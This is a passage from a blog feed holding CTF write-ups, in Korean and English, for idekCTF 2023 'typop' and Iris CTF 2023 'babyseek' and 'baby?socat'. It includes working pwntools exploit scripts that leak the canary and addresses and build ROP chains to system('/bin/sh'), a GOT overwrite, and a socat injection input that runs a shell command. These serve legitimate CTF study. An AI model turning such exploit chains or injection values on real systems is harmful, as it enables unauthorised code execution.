<span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1E</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>bof</code>Í∞Ä Îëê Î≤à Î∞úÏÉùÌïúÎã§. <code>win</code> Ìï®ÏàòÍ∞Ä Ï°¥Ïû¨ÌïòÏßÄÎßå Ïù∏Ïûê ÏÑ∏ Í∞úÎ•º Ïª®Ìä∏Î°§ Ìï¥ÏïºÌï¥ÏÑú ÏÇ¨Ïö©ÌïòÍ∏∞ ÍπåÎã§Î°≠Îã§. <code>csu gadget</code>ÏùÑ Ïù¥Ïö©Ìï¥ÏïºÌïòÎäîÎç∞ <strong><del>Í∏∏Ïù¥ Ï†úÌïú Î∞è Î™®Îì† Î≥¥Ìò∏Í∏∞Î≤ïÏù¥ Îã§ Í±∏Î†§ÏûàÏñ¥ÏÑú <code>got</code>Î•º ÎçÆÏùÑ ÏàòÍ∞Ä ÏóÜÏñ¥ ÏÇ¨Ïö©ÌïòÍ∏∞Í∞Ä Îß§Ïö∞ ÍπåÎã§Î°≠Îã§.</del> <mark>(2023.01.18 update)</mark> Ï∞©Í∞ÅÌñàÎã§. <code>csu_gadget</code>ÏúºÎ°ú ÌíÄÏù¥ÌïòÎäî Í≤ÉÏù¥ Ïù∏ÌÖêÏù¥Í≥† Ìï¥Îãπ ÌíÄÏù¥Îäî ÏïÑÎûò ÎßÅÌÅ¨Î°ú ÌôïÏù∏Ìï† Ïàò ÏûàÎã§.</strong></p><ul><li><a href="https://jiravvit.github.io/230118-idekctf2023-typop2/">https://jiravvit.github.io/230118-idekctf2023-typop2/</a></li></ul><p>Í∑∏ÎûòÏÑú <code>win</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ§Îäî Î∞©Ìñ•Ïù¥ ÏïÑÎãå ÏâòÏùÑ ÌöçÎìùÌïòÎäî Î∞©Ìñ•ÏúºÎ°ú ÌíÄÏù¥Î•º ÏßÑÌñâÌñàÎã§. Ï≤´ Î≤àÏß∏Î°ú ÌÑ∞ÏßÄÎäî <code>bof</code>ÏóêÏÑú stack, canary, pieÎ•º leak Ìï† Ïàò ÏûàÍ≥† Ïù¥Î°ú Ïù∏Ìï¥ <code>rop</code>Î•º ÏßÑÌñâÌïòÏó¨ libc Ï£ºÏÜå ÎòêÌïú Íµ¨Ìï† Ïàò ÏûàÎã§. Í≤∞Íµ≠ Í∑∏ÎÉ• <code>system(&quot;/bin/sh\x00&quot;)</code>Î•º Ïã§ÌñâÏãúÏºú ÏâòÏùÑ ÌöçÎìùÌïòÍ≥† flagÎ•º ÏùΩÏúºÎ©¥ ÎêúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">e.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span></span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(e.address+<span class="number">0x14d3</span>))</span><br><span class="line">pop_rdi = e.address + <span class="number">0x14d3</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.address + <span class="number">0x1410</span>) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x84420</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - babyseek (offset)</title>
      <link href="/230109-irisctf2023-babyseek/"/>
      <url>/230109-irisctf2023-babyseek/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>86 Solves (8.4% of users)<br>167 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I‚Äôll let you seek around my file as far as you want, but you can‚Äôt go anywhere since it‚Äôs &#x2F;dev&#x2F;null.<br><code>nc ret2libm.chal.irisc.tf 10004</code></p><p>To figure out where things are, you can use the gdb debugger. I recommend using a Docker instance, such as with the Dockerfile provided, to ensure you have an environment that matches the remote server you are attacking.</p><p>Hint!<br>You can find the location of functions in the Global Offset Table by using their name followed by @got.plt - for example, print &amp;‚Äò<a href="mailto:&#x66;&#119;&#x72;&#x69;&#116;&#101;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#x6c;&#116;">&#x66;&#119;&#x72;&#x69;&#116;&#101;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#x6c;&#116;</a>‚Äò.</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ chal</span><br><span class="line">‚îú‚îÄ‚îÄ chal.c</span><br><span class="line">‚îú‚îÄ‚îÄ Dockerfile</span><br><span class="line">‚îî‚îÄ‚îÄ Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25a1bb094d7ba8684d70c7686826e67352ceaf0b, for GNU/Linux 3.2.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>This challenge have a source code, So we can view the original source code ! :)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// This is just setup</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is located around %p.\n&quot;</span>, win);</span><br><span class="line"></span><br><span class="line">    FILE* null = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* super_special = &amp;win;</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;void&quot;</span>, <span class="number">1</span>, <span class="number">4</span>, null);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m currently at %p.\n&quot;</span>, null-&gt;_IO_write_ptr); <span class="comment">// [*]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll let you write the flag into nowhere!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Where should I seek into? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pos);</span><br><span class="line">    null-&gt;_IO_write_ptr += pos; <span class="comment">// [**]</span></span><br><span class="line"></span><br><span class="line">    fwrite(&amp;super_special, <span class="keyword">sizeof</span>(<span class="type">void</span>*), <span class="number">1</span>, null);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nice <code>win()</code> function which prints the flag. I like it.</p><p>Let‚Äôs see the <code>[*]</code> and <code>[**]</code> marking in code. First <code>[*]</code>, The <code>null</code> pointer is points to the <code>_IO_write_ptr</code> member of a <code>FILE</code> object. It points to the location where the file is being written to in memory. Before <code>[**]</code>, We can write the value to <code>pos</code>. It is add to the <code>null-&gt;_IO_write_ptr</code> at <code>[**]</code>, So <code>pos</code> is mean the offset.</p><p>The <code>frwite()</code> function attempt to write address of the <code>win()</code> to that offset, and then <code>exit()</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>We can move the pointer that the file is being written to in memory.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Let‚Äôs overwrite the <code>GOT</code> of <code>exit()</code> which is called write after. We calculate the offset of <code>win()</code> to <code>exit@got.plt</code>.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;seek.chal.irisc.tf&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;located around&#x27;</span>)</span><br><span class="line">win = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;win: &#x27;</span>+ <span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line">e.address = win - e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;currently at&#x27;</span>)</span><br><span class="line">curr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;curr: &#x27;</span> + <span class="built_in">hex</span>(curr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># move pos to exit@got</span></span><br><span class="line">offset = e.got[<span class="string">&#x27;exit&#x27;</span>] - curr</span><br><span class="line">info(<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;into?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;not_quite_fseek&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - baby?socat</title>
      <link href="/230109-irisctf2023-babysocat/"/>
      <url>/230109-irisctf2023-babysocat/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>22 Solves (2.1% of users)<br>478 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>love sockets and cats and socat and ls</p><p>Socat version on remote is 1.7.4.1<br><code>nc socat.chal.irisc.tf 10000</code></p><p>By: sera</p><p>The biggest clue to solving this problem is the SOCAT VERSION for intended solution.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ chal.c</span><br><span class="line">‚îî‚îÄ‚îÄ run.sh</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>X</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;Give me your command: &quot;</span></span><br><span class="line"><span class="built_in">read</span> -e -r input</span><br><span class="line">input=<span class="string">&quot;exec:./chal ls <span class="variable">$input</span>&quot;</span></span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">&quot;fakeflg&#123;REDACTED&#125;&quot;</span> socat - <span class="string">&quot;<span class="variable">$input</span>&quot;</span> 2&gt;&amp;0</span><br></pre></td></tr></table></figure><p>The <code>socat</code> is set up execute a <code>chal</code> binary with the parameters <code>ls</code> then the <code>input</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(setenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NO!&quot;</span>, <span class="number">1</span>) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    execvp(argv[<span class="number">1</span>], argv+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The source code of chal binary is just sets the <code>FLAG</code> env empty.</p><h2 id="Vulnerability-amp-Solve-1-intended"><a href="#Vulnerability-amp-Solve-1-intended" class="headerlink" title="Vulnerability &amp; Solve 1 (intended)"></a>Vulnerability &amp; Solve 1 (intended)</h2><p>It would be good to refer to the public writeup for this part. For reference, the change log in the public writeup can be found at the <a href="https://pkgsrc.se/net/socat">pkgsrc.se&#x2F;net&#x2F;socat</a>.</p><ul><li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/socat.md</a></li></ul><p>Finally, The <code>setenv(&quot;FLAG&quot;, &quot;NO!&quot;, 1)</code> is to help prevent any unintended solutions. It retains environment variable only during execution. It would be like I can print env with <code>ls</code>, but I can‚Äôt. I concentrated this part but it was a waste of time. I haven‚Äôt been able to solve this challenge.</p><h2 id="Solve-2-unintended"><a href="#Solve-2-unintended" class="headerlink" title="Solve 2 (unintended)"></a>Solve 2 (unintended)</h2><p>Looking at the Discord, there were many people who solved the challenge in this way. (I think it would be okay to use this solution for later. whenever..)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socat [options] &lt;address&gt; &lt;address&gt;</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">socat -d -d - TCP4:www.example.com:80</span><br></pre></td></tr></table></figure><p>As for the solution, here it is: <code>!!system:env</code></p><p>The <code>system</code> is type of socat address. If you use <code>!!</code>, two single addresses specifications can be combined to form a dual type address for one bytestream.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM:&lt;shell-command&gt;</span><br><span class="line">Forks a sub process that establishes communication with its parent process and invokes the specified program with system() . Please note that &lt;shell-command&gt; [string] must not contain &#x27;,&#x27; or &quot;!!&quot;, and that shell meta characters may have to be protected. After successful program start, socat writes data to stdin of the process and reads from its stdout.</span><br></pre></td></tr></table></figure><p>You can find another type of socat address.:</p><ul><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_TYPES">www.dest-unreach.org/socat/doc/socat.html</a></li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://copyconstruct.medium.com/socat-29453e9fc8a6">https://copyconstruct.medium.com/socat-29453e9fc8a6</a></li><li><a href="http://www.dest-unreach.org/socat/doc/socat.html#ADDRESS_SPECIFICATIONS">http://www.dest-unreach.org/socat/doc/socat.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - ret2libm (simple BOF)</title>
      <link href="/230109-irisctf2023-ret2libm/"/>
      <url>/230109-irisctf2023-ret2libm/</url>
      
